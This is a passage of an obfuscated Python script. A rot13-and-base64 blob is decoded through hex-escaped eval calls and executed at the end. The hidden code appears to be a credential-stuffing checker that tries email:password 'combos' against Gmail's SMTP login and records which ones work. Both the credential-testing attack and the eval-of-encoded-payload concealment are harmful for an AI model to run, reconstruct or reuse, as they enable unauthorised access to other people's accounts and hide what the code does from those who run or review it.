nJjtCFOlLKqsnJ5jqKDbVxAioJWiBvNvXDbXVPOfVQ0to3OyovuxnKWyoJScoPjtVaVvXDbtVTIgVQ0toP5lMJSxoTyhMKZbXDbtVTIgLJyfVQ0tJ10XVPOjLKAmqlN9VSgqPvNtMz9lVTHtnJ4tMJ06PtxtVUNtCFOyYaAjoTy0XPV6VvxXPFNtnJLtVxOaoJScoP5wo20vVTyhVUOoZS06PtxWVPOyoJScoP5upUOyozDbpSfjKFxXPDxtVTDtCFOjJmSqYaWypTkuL2HbVykhVvjtVvVcPtxWVPOjLKAmql5upUOyozDbMPxXPvNtq2ucoTHtL29hqPN8VTkyovuyoJScoPx6PtxtVUZtCFOmoKEjoTyvYyAAISNbW3AgqUNhM21unJjhL29gBwH4AlpcPtxtVUZhp3EupaE0oUZbXDbWVPO0pax6PtxWVPOmYzkiM2yhXTIgLJyfJ2AioaEqYPOjLKAmq1gwo250KFxXPFNtMKuwMKO0BtbWPFNtpUWcoaDtXPWoERySKFVcPtxtVTIfp2H6PtxWVPOzVQ0to3OyovtvM21unJkbLJAeYaE4qPVfVPW3VvxXPDxtVTLhq3WcqTHbMJ1unJkoL29hqS0eVwbvX3Oup3A3J2AioaEqXDbWPFNtpUWcoaDtXPWoGRyJEI0vXDbWPFNtp3IwLlN9VUA1L2ZtXlNkPtxtVTAioaDtCFOwo250VPftZDbXVPOcozy6nJSfMFtcPvNtnJLtp3IwLlN+VQN6PtxtVUOlnJ50VPtvr30tFRSQF0IRVR1OFHkGVv5zo3WgLKDbp3IwLlxcPvNtMJkmMGbXPFNtpUWcoaDtXPWBolOyoJScoUZtnTSwn2IxVvxXMJkcMvOhqJ1wnTftCG0tVwHvBtbtVTygpT9lqPOlMKS1MKA0plNwpTyjVTyhp3EuoTjtpzIkqJImqUZXPvNtMJ1jLKZtCFOcoaO1qPtaD0ZtGTymqPN6VPpcV2Smn3ZtqTuyVUImMKVtMz9lVTRtoTymqPOiMvOwL3ZtnJ4tqUu0VTMipz1uqNbtVTkcqzIwL3ZtCFOipTIhXPqfnKMyL2AmYaE4qPpfVPq3WlxXPvNtMJ1jLKZtCFOipTIhXTIgpTSmYPNapvpcYaWyLJEfnJ5ypltcV29jMJ4tqTuyVTMcoTHtLJ5xVUWyLJDtnKDXVPO1pzjtCFNanUE0pQbiYmHlYwLjYwVlBF4kZv9FMJ5uoJHiLKOcYaObpPpXVPOzo3VtoTymqPOcovOyoKOupmbXVPNtVTAwMaIfoPN9VTkcp3Dhp3ElnKNbXFAlMJSxVUEbMFOznJkyVTkcozHtLaxtoTyhMDbtVPNtpTSlLJ1mCKfXVPNtVPNtW2kcp3EuWmbtL2AzqJkfYPNwMTIznJ5yplO0nTHtL2uyL2ftLaxtqTuyVTkcozImVT9zVUEbMFOznJkyPvNtVPO9PvNtPvNtVPOlMKAjo25mMFN9VUWypKIyp3EmYzqyqPu1pzjfVUOupzSgpm1jLKWuoKZcYaEyrUDwp2IhMUZtLFOaMKDtpzIkqJImqPO3nKEbVUEbMFOjLKWuoJI0MKWmVTEyMzyhMJDtLJWiqzHXVPNtVTyzVPpwHzIjpz92LJEuplptnJ4tpzImpT9hp2H6VPAmMJHtnJLtqTuyVRESDHDtqTI4qPOyrTymqUZtnJ4tqTuyVUWyp3OioaAyPvNtVPNtVUOlnJ50XPWRFHHtCG4tr30vYzMipz1uqPuwL2M1oTjcXFAjpzyhqUZtMTyyVTAwPvNtVPOyoTyzVPqZFIMSVSACGR8tD0ABWlOcovOlMKAjo25mMGbXVPNtVPNtpUWcoaDbVxkWIxHtJ0AQGy0tCG4tr30vYzMipz1uqPuwL2M1oTjcXFAjpzyhqUZtoTy2MFOwL3ZXVPNtVPNtoTy2MJAwpl53pzy0MFuwL2M1oTjtXlNvVSACGR8tD0ABKT4vXDbtVPNtMJkcMvNapTywn3IjK2AupzDaVTyhVUWyp3OioaAyBtbtVPNtVPOjpzyhqPtvGRyJEFOoHRyQF1IDKFN9CvO7sFVhMz9loJS0XTAwMaIfoPxcV3OlnJ50plOfnKMyVTAwpjbtVPNtVPOfnKMyL2AmYaqlnKEyXTAwMaIfoPNeVPVtpTywn3IjK2AupzEpovVcPvNtVPOyoTyzVPqmqT9fMJ5sL2SlMPptnJ4tpzImpT9hp2H6PvNtVPNtVUOlnJ50XPWZFIMSVSgGIR9ZEH5qVQ0+VUg9Vv5zo3WgLKDbL2AzqJkfXFxwpUWcoaEmVTkcqzHtL2AmPvNtVPNtVTkcqzIwL3Zhq3WcqTHbL2AzqJkfVPftVvOGIR9ZEH4tKT4vXDbtVPNtMJkcMvNaoT9mqS9wLKWxWlOcovOlMKAjo25mMGbXVPNtVPNtpUWcoaDbVxkWIxHtJ0kCH1EqVQ0+VUg9Vv5zo3WgLKDbL2AzqJkfXFxwpUWcoaEmVTkcqzHtL2AmPvNtVPNtVTkcqzIwL3Zhq3WcqTHbL2AzqJkfVPftVvOZG1AHVSkhVvxXVPNtVTIfp2H6PvNtVPNtVUOlnJ50XPWZFIMSVSgwqaLtoJS0L2uqVQ0+VUg9Vv5zo3WgLKDbL2AzqJkfXFxwpUWcoaEmVTkcqzHtL2AmPvNtVPNtVTkcqzIwL3Zhq3WcqTHbL2AzqJkfVPftVvOQIyLtKT4vXDcyoUAyBtbtVUE5pTImL3VbVfXcVRIgnJkcolOPLKWlo3AiVP0tDz9UVZXhVvx='
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))